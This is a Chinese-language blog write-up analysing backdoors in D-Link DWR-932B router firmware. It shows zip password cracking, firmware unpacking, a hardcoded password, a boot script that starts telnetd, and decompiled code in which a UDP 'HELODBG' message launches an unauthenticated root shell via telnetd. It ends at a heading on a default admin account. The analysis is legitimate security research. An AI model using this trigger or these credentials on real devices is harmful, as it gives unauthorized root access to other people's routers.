    <content type="html"><![CDATA[<h2 id="DWR-932B后门漏洞分析"><a href="#DWR-932B后门漏洞分析" class="headerlink" title="DWR-932B后门漏洞分析"></a>DWR-932B后门漏洞分析</h2><ul><li><a href="ftp://ftp.dlink.eu/Products/dwr/dwr-932/driver_software/">ftp://ftp.dlink.eu/Products/dwr/dwr-932/driver_software/</a></li></ul><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><h4 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h4><p>zip文件有密码的情况，破解zip密码</p><p>（有的情况下需要先binwalk 解包进去，然后找到文件夹里面的数字.zip破解，否则在外面破解会报错，要注意指定的zip类型，默认是2。拿到密码以后到目录外面的zip输入密码）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcrackzip</span> -b -m zip1 -u -v <span class="hljs-number">40</span>.zip<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/569d60a76018e18a81f4eb9d8fb769d.png" alt="569d60a76018e18a81f4eb9d8fb769d"></p><p>解压后出现2K-mdm-image-mdm9625.yaffs2文件，用binwalk解包</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240828114707067.png" alt="image-20240828114707067"></p><h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h4><p>firmwalker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">***Firmware Directory***<br>-------------------- password --------------------<br>/etc/inadyn-mt.conf:--password 641021<br>-------------------- telnet --------------------<br>/etc/busybox.links:/bin/telnet<br>/etc/busybox.links:/sbin/telnetd<br>/etc/default/rcS:# Set to no <span class="hljs-keyword">if</span> you want to be able to login over telnet/rlogin<br>/etc/init.d/start_appmgr:#<span class="hljs-keyword">if</span> [ -e /config2/telnetd ]; <span class="hljs-keyword">then</span><br>/etc/init.d/start_appmgr:#Sandro &#123; <span class="hljs-keyword">for</span> telnetd debug...<br>/etc/init.d/start_appmgr:start-stop-daemon -S -b -a /sbin/telnetd<br>/etc/rc0.d/K30start_appmgr:#<span class="hljs-keyword">if</span> [ -e /config2/telnetd ]; <span class="hljs-keyword">then</span><br>/etc/rc0.d/K30start_appmgr:#Sandro &#123; <span class="hljs-keyword">for</span> telnetd debug...<br>/etc/rc0.d/K30start_appmgr:start-stop-daemon -S -b -a /sbin/telnetd<br>/etc/rc1.d/K30start_appmgr:#<span class="hljs-keyword">if</span> [ -e /config2/telnetd ]; <span class="hljs-keyword">then</span><br>/etc/rc1.d/K30start_appmgr:#Sandro &#123; <span class="hljs-keyword">for</span> telnetd debug...<br>/etc/rc1.d/K30start_appmgr:start-stop-daemon -S -b -a /sbin/telnetd<br>/etc/rc6.d/K30start_appmgr:#<span class="hljs-keyword">if</span> [ -e /config2/telnetd ]; <span class="hljs-keyword">then</span><br>/etc/rc6.d/K30start_appmgr:#Sandro &#123; <span class="hljs-keyword">for</span> telnetd debug...<br>/etc/rc6.d/K30start_appmgr:start-stop-daemon -S -b -a /sbin/telnetd<br>/etc/rcS.d/S50start_appmgr:#<span class="hljs-keyword">if</span> [ -e /config2/telnetd ]; <span class="hljs-keyword">then</span><br>/etc/rcS.d/S50start_appmgr:#Sandro &#123; <span class="hljs-keyword">for</span> telnetd debug...<br>/etc/rcS.d/S50start_appmgr:start-stop-daemon -S -b -a /sbin/telnetd<br>/etc/services:rtelnet107/tcp<span class="hljs-comment"># Remote Telnet</span><br>/etc/services:rtelnet107/udp<br>/etc/services:telnet23/tcp<br>/etc/services:telnets992/tcp<span class="hljs-comment"># Telnet over SSL</span><br>/etc/services:telnets992/udp<br>/etc/services:tfido60177/tcp<span class="hljs-comment"># fidonet EMSI over telnet</span><br>/var/lib/opkg/alternatives/telnet:/bin/telnet<br>/var/lib/opkg/alternatives/telnetd:/sbin/telnetd<br></code></pre></td></tr></table></figure><p>枚举到硬编码的密码</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240828114810215.png" alt="image-20240828114810215"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240828114841776.png" alt="image-20240828114841776"></p><h5 id="查看启动项"><a href="#查看启动项" class="headerlink" title="查看启动项"></a>查看启动项</h5><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs tap">cd etc/init.d<br>ls -l<br>total 252<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 2482 </span>Sep<span class="hljs-number"> 17 </span>03:55 adbd<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 250 </span>Sep<span class="hljs-number"> 17 </span>03:55 alignment.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 4735 </span>Sep<span class="hljs-number"> 17 </span>03:55 avahi-daemon<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 4490 </span>Sep<span class="hljs-number"> 17 </span>03:55 avahi-dnsconfd<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 492 </span>Sep<span class="hljs-number"> 17 </span>03:55 banner.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1529 </span>Sep<span class="hljs-number"> 17 </span>03:55 bootlogd<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1680 </span>Sep<span class="hljs-number"> 17 </span>03:55 bootmisc.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 681 </span>Sep<span class="hljs-number"> 17 </span>03:55 busybox-cron<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 3229 </span>Sep<span class="hljs-number"> 17 </span>03:55 checkroot.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 151 </span>Sep<span class="hljs-number"> 17 </span>03:55 chgrp-diag<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1591 </span>Sep<span class="hljs-number"> 17 </span>03:55 data-init<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 2781 </span>Sep<span class="hljs-number"> 17 </span>03:55 dbus-1<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 526 </span>Sep<span class="hljs-number"> 17 </span>03:55 devpts.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 408 </span>Sep<span class="hljs-number"> 17 </span>03:55 diagrebootapp<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 2674 </span>Sep<span class="hljs-number"> 17 </span>03:55 dropbear<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1123 </span>Sep<span class="hljs-number"> 17 </span>03:55 functions<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 510 </span>Sep<span class="hljs-number"> 17 </span>03:55 halt<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 270 </span>Sep<span class="hljs-number"> 17 </span>03:55 hostname.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 2402 </span>Sep<span class="hljs-number"> 17 </span>03:55 hwclock.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 348 </span>Sep<span class="hljs-number"> 17 </span>03:55 keymap.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 169 </span>Sep<span class="hljs-number"> 17 </span>03:55 mdev<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 168 </span>Sep<span class="hljs-number"> 17 </span>03:55 modem-shutdown<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 878 </span>Sep<span class="hljs-number"> 17 </span>03:55 modutils.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 859 </span>Sep<span class="hljs-number"> 17 </span>03:55 mountall.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1399 </span>Sep<span class="hljs-number"> 17 </span>03:55 mountnfs.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 783 </span>Sep<span class="hljs-number"> 17 </span>03:55 netmgrd<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1463 </span>Sep<span class="hljs-number"> 17 </span>03:55 networking<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 5114 </span>Sep<span class="hljs-number"> 17 </span>03:55 populate-volatile.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 10835 </span>Sep<span class="hljs-number"> 17 </span>03:55 power_config<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1136 </span>Sep<span class="hljs-number"> 17 </span>03:55 qmi_shutdown_modemd<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 610 </span>Sep<span class="hljs-number"> 17 </span>03:55 qmuxd<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 368 </span>Sep<span class="hljs-number"> 17 </span>03:55 qrngd<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 4346 </span>Sep<span class="hljs-number"> 17 </span>03:55 rc<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 525 </span>Sep<span class="hljs-number"> 17 </span>03:55 rcS<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 2015 </span>Sep<span class="hljs-number"> 17 </span>03:55 reboot<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 159 </span>Sep<span class="hljs-number"> 17 </span>03:55 reset_reboot_cookie<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 585 </span>Sep<span class="hljs-number"> 17 </span>03:55 rmnologin.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 609 </span>Sep<span class="hljs-number"> 17 </span>03:55 run-postinsts<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 321 </span>Sep<span class="hljs-number"> 17 </span>03:55 save-rtc.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 438 </span>Sep<span class="hljs-number"> 17 </span>03:55 sendsigs<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 978 </span>Sep<span class="hljs-number"> 17 </span>03:55 set-hwver.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1836 </span>Sep<span class="hljs-number"> 17 </span>03:55 shutdown<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 578 </span>Sep<span class="hljs-number"> 17 </span>03:55 single<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 2178 </span>Sep<span class="hljs-number"> 17 </span>03:55 start_appmgr<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 2138 </span>Sep<span class="hljs-number"> 17 </span>03:55 start_ipacm_le<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 764 </span>Sep<span class="hljs-number"> 17 </span>03:55 start_QCMAP_ConnectionManager_le<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1001 </span>Sep<span class="hljs-number"> 17 </span>03:55 start_qti_le<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 8 </span>Sep<span class="hljs-number"> 17 </span>03:55 stop-bootlogd -&gt; bootlogd<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 540 </span>Sep<span class="hljs-number"> 17 </span>03:55 sysfs.sh<br>lrwxrwxrwx<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 14 </span>Sep<span class="hljs-number"> 17 </span>03:55 syslog -&gt; syslog.busybox<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1559 </span>Sep<span class="hljs-number"> 17 </span>03:55 syslog.busybox<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 659 </span>Sep<span class="hljs-number"> 17 </span>03:55 thermal-engine<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 516 </span>Sep<span class="hljs-number"> 17 </span>03:55 umountfs<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 686 </span>Sep<span class="hljs-number"> 17 </span>03:55 umountnfs.sh<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 1349 </span>Sep<span class="hljs-number"> 17 </span>03:55 urandom<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 5005 </span>Sep<span class="hljs-number"> 17 </span>03:55 usb<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 8116 </span>Sep<span class="hljs-number"> 17 </span>03:55 wlan<br></code></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>这里可以看一下 <code>start_appmgr</code> 脚本，mgr 一般就是主控程序的意思</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> start_appmgr<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/sh</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-comment"># appmgr init.d script to start router daemon</span><br><span class="hljs-built_in">export</span> KERNEL=`<span class="hljs-built_in">uname</span> -r`<br><span class="hljs-built_in">export</span> MODULE_BASE=/lib/modules/<span class="hljs-variable">$KERNEL</span>/updates<br><span class="hljs-built_in">export</span> RETRY_LIMIT=3<br><span class="hljs-built_in">export</span> SDCC_SLOT=3<br><span class="hljs-built_in">export</span> SDCC_SLOT2=2<br><br><span class="hljs-comment">#Vince &#123;</span><br>BOOT_MODE=`<span class="hljs-built_in">cat</span> /proc/cmdline | sed -n <span class="hljs-string">&#x27;s/.*boot_mode=\(........\) .*/\1/p&#x27;</span>`<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;x<span class="hljs-variable">$&#123;BOOT_MODE&#125;</span>&quot;</span> == <span class="hljs-string">&quot;xcharging&quot;</span> ]; <span class="hljs-keyword">then</span><br>start-stop-daemon -S -b -a /bin/pfcharging<br><span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><span class="hljs-comment">#Vince &#125;</span><br><br><span class="hljs-comment">#Sandro &#123; for telnetd debug...</span><br>start-stop-daemon -S -b -a /bin/logmaster<br><span class="hljs-comment">#if [ -e /config2/telnetd ]; then</span><br>start-stop-daemon -S -b -a /sbin/telnetd<br><span class="hljs-comment">#fi</span><br><span class="hljs-comment">#Sandro &#125;</span><br><br><span class="hljs-comment">#Sandro set hw id start</span><br><span class="hljs-keyword">if</span> [ -e /etc/init.d/set-hwver.sh ]; <span class="hljs-keyword">then</span><br>/etc/init.d/set-hwver.sh<br><span class="hljs-keyword">fi</span><br><span class="hljs-comment">#Sandro set hw id end</span><br><br><span class="hljs-keyword">if</span> [ ! -e /etc/versions ]; <span class="hljs-keyword">then</span><br><span class="hljs-keyword">if</span> [ -e /usr/etc/versions ]; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">ln</span> -nsf /usr/etc/versions /etc/versions<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ ! -e /etc/qrcfg ]; <span class="hljs-keyword">then</span><br><span class="hljs-keyword">if</span> [ -d /usr/etc/qrcfg ]; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">ln</span> -nsf /usr/etc/qrcfg /etc/qrcfg<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ ! -e /www ]; <span class="hljs-keyword">then</span><br><span class="hljs-keyword">if</span> [ -d /usr/www ]; <span class="hljs-keyword">then</span><br><span class="hljs-built_in">ln</span> -sf /usr/www /www<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [  -f /sbin/netcfg ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;chmod 777 netcfg&quot;</span><br>        <span class="hljs-built_in">chmod</span> 777 /sbin/netcfg<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [  -f /bin/QNetCfg ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;chmod 777 QNetCfg&quot;</span><br>        <span class="hljs-built_in">chmod</span> 777 /bin/QNetCfg<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment">#if [ ! -e /data ]; then</span><br><span class="hljs-comment">#        mkdir -p /data</span><br><span class="hljs-comment">#        mount -t yaffs2 /dev/mtdblock12 /data</span><br><span class="hljs-comment">#fi</span><br><br><span class="hljs-comment"># Get the vendor_id, [Generic|Pure]</span><br>VENDOR_ID=$(grep vendor_id /etc/versions 2&gt;/dev/null | awk -F<span class="hljs-string">&quot;=&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-keyword">in</span><br>    start)<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$VENDOR_ID</span>&quot;</span> = <span class="hljs-string">&quot;Pure&quot;</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;Starting btnd: &quot;</span><br>            start-stop-daemon -S -b -a /bin/btnd<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;done&quot;</span><br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;Starting appmgr: &quot;</span><br>            start-stop-daemon -S -b -a /bin/appmgr<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;done&quot;</span><br>        <span class="hljs-keyword">fi</span><br>        ;;<br>    stop)<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$VENDOR_ID</span>&quot;</span> = <span class="hljs-string">&quot;Pure&quot;</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;Stopping btnd: &quot;</span><br>            start-stop-daemon -K -n btnd<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;done&quot;</span><br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;Stopping appmgr: &quot;</span><br>            start-stop-daemon -K -n appmgr<br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;done&quot;</span><br>        <span class="hljs-keyword">fi</span><br>        ;;<br>    restart)<br>        <span class="hljs-variable">$0</span> stop<br>        <span class="hljs-variable">$0</span> start<br>        ;;<br>    *)<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage appmgr &#123; start | stop | restart&#125;&quot;</span> &gt;&amp;2<br>        <span class="hljs-built_in">exit</span> 1<br>        ;;<br><span class="hljs-keyword">esac</span><br><br><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><p>该脚本会在开机的时候以服务的形式运行 <code>/bin/appmgr</code> 程序。</p><p>同时该脚本还会开启 telnet 服务</p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829101338488.png" alt="image-20240829101338488"></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp">......<br>              <span class="hljs-keyword">if</span> ( (((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v<span class="hljs-number">63.</span>__fds_bits[(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_<span class="hljs-number">7E174</span> &gt;&gt; <span class="hljs-number">5</span>] &gt;&gt; (dword_<span class="hljs-number">7E174</span> &amp; <span class="hljs-number">0x1F</span>)) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>              &#123;<br>                <span class="hljs-built_in">memset</span>(&amp;v64, <span class="hljs-number">0</span>, <span class="hljs-number">0x80u</span>);<br>                addr_len[<span class="hljs-number">0</span>] = <span class="hljs-number">16</span>;<br>                <span class="hljs-keyword">if</span> ( dword_<span class="hljs-number">7E174</span> &gt;= <span class="hljs-number">0</span> )<br>                &#123;<br>                  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">recvfrom</span>(dword_<span class="hljs-number">7E174</span>, &amp;v64, <span class="hljs-number">0x200u</span>, <span class="hljs-number">0</span>, &amp;stru_8411C, addr_len) &gt; <span class="hljs-number">0</span> )<br>                  &#123;<br>                    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(<span class="hljs-string">&quot;HELODBG&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v64, <span class="hljs-number">7u</span>) )<br>                    &#123;<br>                      dword_<span class="hljs-number">7E178</span> = <span class="hljs-number">1</span>;<br>                      <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)&amp;v64, <span class="hljs-string">&quot;Hello\n&quot;</span>);<br>                      v37 = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v64);<br>                      <span class="hljs-built_in">sendto</span>(dword_<span class="hljs-number">7E174</span>, &amp;v64, v37 + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;stru_8411C, addr_len[<span class="hljs-number">0</span>]);<br>                      <span class="hljs-keyword">if</span> ( !unk_84138 )<br>                      &#123;<br>                        unk_84138 = <span class="hljs-number">1</span>;<br>                        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/sbin/telnetd -l /bin/sh&quot;</span>);<br>                      &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(<span class="hljs-string">&quot;BYEDBG&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v64, <span class="hljs-number">6u</span>) )<br>                    &#123;<br>                      dword_<span class="hljs-number">7E178</span> = <span class="hljs-number">0</span>;<br>                    &#125;<br>                    <span class="hljs-built_in">LOBYTE</span>(v<span class="hljs-number">64.</span>sa_family) = <span class="hljs-number">0</span>;<br>                  &#125;<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( (v61 &amp; v<span class="hljs-number">63.</span>__fds_bits[v60]) != <span class="hljs-number">0</span> )<br>              &#123;<br>                <span class="hljs-built_in">qfmon_evt_handle</span>(&amp;gFmonHdl, &amp;v63);<br>              &#125;<br>........<br></code></pre></td></tr></table></figure><p>这段代码实现了一个简单的网络服务，它监听一个特定的端口，并处理来自客户端的连接。当客户端发送 “HELODBG” 消息时，服务端会发送 “Hello\n” 回复，并启动 telnetd 守护进程，允许用户通过 telnet 连接到设备。当客户端发送 “BYEDBG” 消息时，服务端会关闭 telnetd 守护进程。此外，代码还处理其他事件，例如来自其他文件描述符的事件。</p><p><strong>安全问题：</strong></p><p>这段代码存在潜在的安全问题：</p><ul><li><strong>未经身份验证的 telnetd：</strong> telnetd 守护进程没有进行身份验证，任何人都可以通过 telnet 连接到设备，并获取 root 权限。</li><li><strong>数据处理漏洞：</strong> 代码没有对接收到的数据进行充分的验证和过滤，可能会导致缓冲区溢出或其他安全问题。</li></ul><h4 id="后门一"><a href="#后门一" class="headerlink" title="后门一"></a>后门一</h4><p>默认admin账号</p><p>搜索admin字符串</p><p><img 